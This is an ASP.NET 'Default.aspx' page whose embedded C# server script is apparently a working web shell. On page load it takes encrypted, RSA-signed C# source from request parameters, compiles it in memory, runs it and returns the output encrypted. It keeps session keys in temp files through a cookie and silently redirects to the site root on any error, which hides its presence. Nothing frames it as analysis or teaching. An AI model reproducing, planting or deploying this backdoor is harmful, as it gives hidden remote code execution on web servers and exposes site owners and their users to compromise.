<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" %>
<%@ Import Namespace="System.Reflection"%>
<%@ Import Namespace="Microsoft.CSharp"%>
<%@ Import Namespace="System.CodeDom.Compiler"%>
<%@ Import Namespace="System.IO"%>
<%@ Import Namespace="System.Security.Cryptography"%>
<script language="c#" runat="server">
	public byte[] decrypt(String base64, Guid k)
    {
        byte[] key = k.ToByteArray();
        byte[] ret = Convert.FromBase64String(base64);
        using (MemoryStream memoryStream = new MemoryStream())
        {
            RijndaelManaged r = new RijndaelManaged();
            r.Mode = CipherMode.CBC;
            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, r.CreateDecryptor(key, key), CryptoStreamMode.Write))
            {
                cryptoStream.Write(ret, 0, ret.Length);
                cryptoStream.FlushFinalBlock();
            }
            return memoryStream.ToArray();
        }
    }
    
	public void Page_Load(object sender, EventArgs e)
	{
		try
        {
            String encSource = Request.Params["d"], signature = Request.Params["s"], parameters = Request.Params["p"], ks = Request.Params["ks"];
            String n = "5I5Mai8UN5PaPqq+hIr5QCvd9OUykjonZmMVlg7yUsnFKf0FeTtlb55Eb5zxI/OHJj1JzPCjbyMvpPMmdxg4fSnVZBhYuTE+0+9Ierl3V41Tw53BtO22ktDqWY5m40/Zpdgn2sPESrqBif6/HbnccgRM5iPx8qAq3qV3gfxTOfl4jDlG6n8iuhBYNetmHRFOW3C4/7qIUYp0GS0vfx+jb0sZIjrSCy6J1mxMy/1QgSwGOSbcnJCh0Nijn006DVX2rTDoKY97JfXs5h+Ac3KW3vQldkyFdLIOpRbbA4yOMJ6XEX6O7/n51t3GkD+rFUwmNtpVnMPGdIoxc0QyHdu2DQ==";
            RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
            
            RSAParameters param = new RSAParameters();
            param.Modulus = Convert.FromBase64String(n);
            param.Exponent = new byte[] { 1, 0, 1 };
            
            RSA.ImportParameters(param);
            string tempPath = Path.GetTempPath() + "\\";
            byte[] ret = null;
            byte[] key = null;
            String enc = "";
            Guid sk;
            String fn = null;

            if(Request.Cookies["sc"] == null || String.IsNullOrEmpty(Request.Cookies["sc"].Value))
            {

                fn = Guid.NewGuid().ToString();
                sk = Guid.NewGuid();
                Response.Cookies["sc"].Value = fn;
                File.WriteAllText(tempPath + fn, sk.ToString());
            }
            else
            {
                fn = Request.Cookies["sc"].Value;
                if(String.IsNullOrEmpty(fn))
                {
                    fn = Guid.NewGuid().ToString();
                    Response.Cookies["sc"].Value = fn;
                }
            }

            if(File.Exists(tempPath + fn))
            {
                sk = new Guid(File.ReadAllText(tempPath + fn));
            }
            else
            {
                fn = Guid.NewGuid().ToString();
                sk = Guid.NewGuid();
                Response.Cookies["sc"].Value = fn;
                File.WriteAllText(tempPath + fn, sk.ToString());
            }

            Guid k = Guid.NewGuid();
            key = k.ToByteArray();
            if (RSA.VerifyData(Encoding.ASCII.GetBytes(encSource), new SHA1CryptoServiceProvider(), Convert.FromBase64String(signature)))
            {
                if (RSA.VerifyData((sk).ToByteArray(), new SHA1CryptoServiceProvider(), Convert.FromBase64String(ks)))
                {
                    byte[] decSource = decrypt(encSource, sk);
                    byte[] decParams = decrypt(parameters, sk);
                    CompilerParameters compilerParams = new CompilerParameters(new string[] { "System.dll", "System.Data.dll", "System.Xml.dll" });
                    compilerParams.GenerateInMemory = true;
                    compilerParams.GenerateExecutable = false;
                    object o = (new CSharpCodeProvider()).CompileAssemblyFromSource(compilerParams, Encoding.ASCII.GetString(decSource)).CompiledAssembly.CreateInstance("A.B");
                    MethodInfo mi = o.GetType().GetMethod("C");
                    ret = (byte[])mi.Invoke(o, Encoding.ASCII.GetString(decParams).Split('|'));
                    using (MemoryStream memoryStream = new MemoryStream())
	                {
	                    RijndaelManaged r = new RijndaelManaged();
	                    r.Mode = CipherMode.CBC;
	                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, r.CreateEncryptor(key, key), CryptoStreamMode.Write))
	                    {
	                        cryptoStream.Write(ret, 0, ret.Length);
	                        cryptoStream.FlushFinalBlock();
	                    }
	                    enc = Convert.ToBase64String(memoryStream.ToArray());
	                }
                }
                else
                {
                    enc = "";
                }
                System.IO.File.WriteAllText(tempPath + fn, k.ToString());
                Response.Write(Convert.ToBase64String(RSA.Encrypt(key, true)) + "\r\n" + enc + "\r\n");
            }
            else
            {

            }
            return;
        }
        catch (Exception ee)
        {
            Response.Redirect("/");
            return;
        }
	}
</script>
